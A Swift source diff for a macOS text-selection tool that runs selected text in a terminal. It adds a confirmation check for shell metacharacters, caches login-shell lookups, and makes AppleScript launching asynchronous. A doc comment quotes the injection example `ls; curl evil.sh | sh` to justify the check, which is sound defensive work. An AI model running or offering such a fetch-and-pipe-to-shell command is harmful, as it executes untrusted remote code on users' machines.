@@ -399,6 +399,10 @@ struct SelectionBarTerminalCommandService {
   }
 
   private func preparedCommandText(from text: String) -> String {
+    Self.preparedCommandText(from: text)
+  }
+
+  nonisolated static func preparedCommandText(from text: String) -> String {
     text.trimmingCharacters(in: .whitespacesAndNewlines)
   }
 
@@ -469,7 +473,94 @@ struct SelectionBarTerminalCommandService {
       }
     }
 
-    return loginShellCommandResolver(token, shellPath)
+    // Falling through to a login shell is expensive — it forks `$SHELL -lc`,
+    // which sources the user's rc files. Every ordinary prose selection reaches
+    // here, so screen out anything that cannot be a command name first, and
+    // memoize the answer (including misses) for the tokens that survive.
+    guard Self.isPlausibleCommandName(token) else { return nil }
+    return Self.cachedLoginShellResolution(token: token, shellPath: shellPath) {
+      loginShellCommandResolver(token, shellPath)
+    }
+  }
+
+  /// Whether running this selection warrants an explicit confirmation.
+  ///
+  /// Only the *first* token is ever validated against `PATH`; the rest of the
+  /// selection is handed verbatim to `$SHELL -lc`, so `ls; curl evil.sh | sh`
+  /// passes the runnable check. Since the input is arbitrary text the user
+  /// selected — often on a web page they do not control — anything that can
+  /// chain, substitute or redirect gets a confirmation prompt. A plain
+  /// single command stays one click.
+  nonisolated static func requiresConfirmation(for text: String) -> Bool {
+    let command = preparedCommandText(from: text)
+    guard !command.isEmpty else { return false }
+
+    // More than one line means more than one command.
+    if command.contains(where: \.isNewline) { return true }
+
+    // Backslashes can smuggle any of the below past a naive reading.
+    if command.contains("\\") { return true }
+
+    var inSingleQuote = false
+    var inDoubleQuote = false
+    for character in command {
+      switch character {
+      case "'" where !inDoubleQuote:
+        inSingleQuote.toggle()
+      case "\"" where !inSingleQuote:
+        inDoubleQuote.toggle()
+      case ";", "|", "&", "`", ">", "<", "(", ")", "{", "}", "\n":
+        // Quoted metacharacters are inert, so only flag bare ones.
+        if !inSingleQuote && !inDoubleQuote { return true }
+      case "$":
+        // `$(...)` and `$VAR` both expand; single quotes suppress that.
+        if !inSingleQuote { return true }
+      default:
+        continue
+      }
+    }
+
+    // An unbalanced quote means the shell will not parse this the way it reads.
+    return inSingleQuote || inDoubleQuote
+  }
+
+  /// Cheap structural test for "could this token name an executable?".
+  /// Executable names are short and drawn from a narrow character set; prose
+  /// words, punctuation and URLs are rejected without forking anything.
+  nonisolated static func isPlausibleCommandName(_ token: String) -> Bool {
+    guard !token.isEmpty, token.count <= 64 else { return false }
+    return token.unicodeScalars.allSatisfy { scalar in
+      CharacterSet.alphanumerics.contains(scalar)
+        || scalar == "." || scalar == "_" || scalar == "-" || scalar == "+"
+    }
+  }
+
+  private nonisolated(unsafe) static var loginShellResolutionCache: [String: URL?] = [:]
+  private nonisolated static let loginShellResolutionCacheLock = NSLock()
+  private nonisolated static let loginShellResolutionCacheLimit = 256
+
+  nonisolated private static func cachedLoginShellResolution(
+    token: String,
+    shellPath: String,
+    resolve: () -> URL?
+  ) -> URL? {
+    let key = "\(shellPath)\t\(token)"
+
+    loginShellResolutionCacheLock.lock()
+    let cached = loginShellResolutionCache[key]
+    loginShellResolutionCacheLock.unlock()
+    if let cached { return cached }
+
+    let resolved = resolve()
+
+    loginShellResolutionCacheLock.lock()
+    if loginShellResolutionCache.count >= loginShellResolutionCacheLimit {
+      loginShellResolutionCache.removeAll(keepingCapacity: true)
+    }
+    loginShellResolutionCache[key] = resolved
+    loginShellResolutionCacheLock.unlock()
+
+    return resolved
   }
 
   private func embeddedExecutableURL(
@@ -689,7 +780,13 @@ struct SelectionBarTerminalCommandService {
     ]
   }
 
-  static func runAppleScript(_ request: SelectionBarTerminalAppleScriptRequest) async throws {
+  /// `nonisolated` and continuation-based on purpose: osascript has to
+  /// cold-launch Terminal/iTerm2/Ghostty, which takes seconds. Inheriting
+  /// `@MainActor` and blocking in `waitUntilExit()` beachballed the whole UI on
+  /// every "Run command".
+  nonisolated static func runAppleScript(_ request: SelectionBarTerminalAppleScriptRequest)
+    async throws
+  {
     let process = Process()
     process.executableURL = URL(fileURLWithPath: "/usr/bin/osascript")
     process.arguments = ["-"] + request.arguments
@@ -701,29 +798,45 @@ struct SelectionBarTerminalCommandService {
     process.standardOutput = FileHandle.nullDevice
     process.standardError = errorPipe
 
-    do {
-      try process.run()
-    } catch {
-      throw SelectionBarTerminalCommandServiceError.appleScriptFailed(error.localizedDescription)
-    }
+    try await withCheckedThrowingContinuation {
+      (continuation: CheckedContinuation<Void, Error>) in
+      process.terminationHandler = { finished in
+        guard finished.terminationStatus == 0 else {
+          let errorData = errorPipe.fileHandleForReading.readDataToEndOfFile()
+          let errorText =
+            String(data: errorData, encoding: .utf8)?
+            .trimmingCharacters(in: .whitespacesAndNewlines)
+          continuation.resume(
+            throwing: SelectionBarTerminalCommandServiceError.appleScriptFailed(
+              errorText?.isEmpty == false
+                ? errorText! : "exit status \(finished.terminationStatus)"
+            )
+          )
+          return
+        }
+        continuation.resume()
+      }
 
-    if let data = request.source.data(using: .utf8) {
-      inputPipe.fileHandleForWriting.write(data)
-    }
-    try? inputPipe.fileHandleForWriting.close()
+      do {
+        try process.run()
+      } catch {
+        process.terminationHandler = nil
+        continuation.resume(
+          throwing: SelectionBarTerminalCommandServiceError.appleScriptFailed(
+            error.localizedDescription
+          )
+        )
+        return
+      }
 
-    process.waitUntilExit()
-
-    guard process.terminationStatus == 0 else {
-      let errorData = errorPipe.fileHandleForReading.readDataToEndOfFile()
-      let errorText =
-        String(data: errorData, encoding: .utf8)?.trimmingCharacters(in: .whitespacesAndNewlines)
-        ?? "exit status \(process.terminationStatus)"
-      throw SelectionBarTerminalCommandServiceError.appleScriptFailed(errorText)
+      if let data = request.source.data(using: .utf8) {
+        inputPipe.fileHandleForWriting.write(data)
+      }
+      try? inputPipe.fileHandleForWriting.close()
     }
   }
 
-  static func runProcess(_ request: SelectionBarTerminalProcessRequest) throws {
+  nonisolated static func runProcess(_ request: SelectionBarTerminalProcessRequest) throws {
     let process = Process()
     process.executableURL = request.executableURL
     process.arguments = request.arguments
@@ -743,7 +856,7 @@ struct SelectionBarTerminalCommandService {
     }
   }
 
-  static func writeFile(_ request: SelectionBarTerminalFileWriteRequest) throws {
+  nonisolated static func writeFile(_ request: SelectionBarTerminalFileWriteRequest) throws {
     let directoryURL = request.fileURL.deletingLastPathComponent()
     try FileManager.default.createDirectory(
       at: directoryURL,
@@ -754,9 +867,33 @@ struct SelectionBarTerminalCommandService {
 
   static func scheduleCleanup(for fileURLs: [URL]) {
     guard !fileURLs.isEmpty else { return }
+    // Sweep leftovers from earlier runs first: if the app quit before a
+    // deferred cleanup fired, the launch config — which contains the user's
+    // shell command — would otherwise sit in ~/.warp indefinitely.
+    removeOrphanedLaunchConfigurations(besides: Set(fileURLs))
     Task.detached(priority: .utility) {
       try? await Task.sleep(for: .seconds(30))
       for fileURL in fileURLs {
+        try? FileManager.default.removeItem(at: fileURL)
+      }
+    }
+  }
+
+  /// Deletes `selectionbar-run-command-*.yaml` files left behind by previous
+  /// runs, keeping the ones this launch is still using.
+  private static func removeOrphanedLaunchConfigurations(besides live: Set<URL>) {
+    let livePaths = Set(live.map(\.standardizedFileURL.path))
+    let directories = Set(live.map { $0.deletingLastPathComponent().standardizedFileURL })
+    for directory in directories {
+      let contents = try? FileManager.default.contentsOfDirectory(
+        at: directory,
+        includingPropertiesForKeys: nil
+      )
+      for fileURL in contents ?? [] {
+        guard fileURL.lastPathComponent.hasPrefix("selectionbar-run-command-"),
+          fileURL.pathExtension == "yaml",
+          !livePaths.contains(fileURL.standardizedFileURL.path)
+        else { continue }
         try? FileManager.default.removeItem(at: fileURL)
       }
     }
